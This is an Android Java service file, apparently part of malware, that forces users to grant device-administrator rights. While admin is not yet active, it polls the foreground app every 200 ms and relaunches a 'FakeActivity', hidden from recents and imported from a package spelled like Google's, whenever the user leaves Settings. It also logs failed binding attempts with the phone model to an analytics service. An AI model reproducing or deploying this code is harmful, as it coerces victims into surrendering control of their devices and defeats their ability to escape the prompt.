package com.xstd.plugin.service;

import android.app.ActivityManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import com.googl.plugin.x.FakeActivity;
import com.xstd.plugin.Utils.CommonUtil;
import com.xstd.plugin.binddevice.DeviceBindBRC;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;
import com.xstd.plugin.config.SettingManager;

import java.util.HashMap;

/**
 * Created by michael on 13-12-12.
 */
public class WatchService extends Service {

    private Thread mWatchingThread;

    private boolean mDeviceWindowShowInBinding = false;

    private long mStartTime;

    @Override
    public void onCreate() {
        super.onCreate();

        if (CommonUtil.isBindingActive(getApplicationContext())) {
            if (Config.DEBUG) {
                Config.LOGD("[[WatchService::onCreate]] just STOP SELF as the DEVICE BINDING is ACTIVE");
            }

            stopSelf();

            return;
        }

        mStartTime = System.currentTimeMillis();

        AppRuntime.WATCHING_SERVICE_RUNNING.set(true);
        AppRuntime.WATCHING_SERVICE_BREAK.set(false);
        AppRuntime.WATCHING_TOP_IS_SETTINGS.set(false);

        final ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        mWatchingThread = new Thread(new Runnable() {
            @Override
            public void run() {
                while (!AppRuntime.WATCHING_SERVICE_BREAK.get()) {
                    DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                    boolean isDeviceBinded = dpm.isAdminActive(new ComponentName(getApplicationContext(), DeviceBindBRC.class));
                    if (isDeviceBinded) break;

                    long curTime = System.currentTimeMillis();
                    if ((curTime - mStartTime) >= 60000 && !mDeviceWindowShowInBinding) {
                        AppRuntime.WATCHING_SERVICE_BREAK.set(true);
                        AppRuntime.WATCHING_TOP_IS_SETTINGS.set(false);

                        Intent i = new Intent();
                        i.setAction(FakeService.BIND_WINDOW_DISMISS);
                        sendBroadcast(i);

                        continue;
                    }

                    try {
                        Thread.sleep(200);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                    String packname = am.getRunningTasks(1).get(0).topActivity.getPackageName();
                    if (Config.DEBUG) {
                        Config.LOGD("[[WatchService]] current top package : " + packname + " isDeviceBinded : (" + isDeviceBinded + ")");
                    }

                    if (!"com.android.settings".equals(packname)) {
                        AppRuntime.WATCHING_TOP_IS_SETTINGS.set(false);
                        Intent i = new Intent();
                        i.setClass(getApplicationContext(), FakeActivity.class);
                        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                        startActivity(i);

                        try {
                            Thread.sleep(500);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    } else {
                        AppRuntime.WATCHING_TOP_IS_SETTINGS.set(true);
                        mDeviceWindowShowInBinding = true;
                    }
                }

                AppRuntime.WATCHING_SERVICE_BREAK.set(true);
                stopSelf();
            }
        });

        mWatchingThread.start();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (!mDeviceWindowShowInBinding) {
            //在次级激活中用户的设备激活页面一次也没有置顶，标识用户的设备绑定有问题，通知
            //统计服务器
            HashMap<String, String> log = new HashMap<String, String>();
            log.put("phoneType", Build.MODEL);
            log.put("bindingCount", String.valueOf(SettingManager.getInstance().getDeviceBindingCount() + 1));
            CommonUtil.umengLog(getApplicationContext(), "bind_failed_window_not_show", log);
        }

        AppRuntime.WATCHING_SERVICE_RUNNING.set(false);
        AppRuntime.WATCHING_TOP_IS_SETTINGS.set(false);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }
}
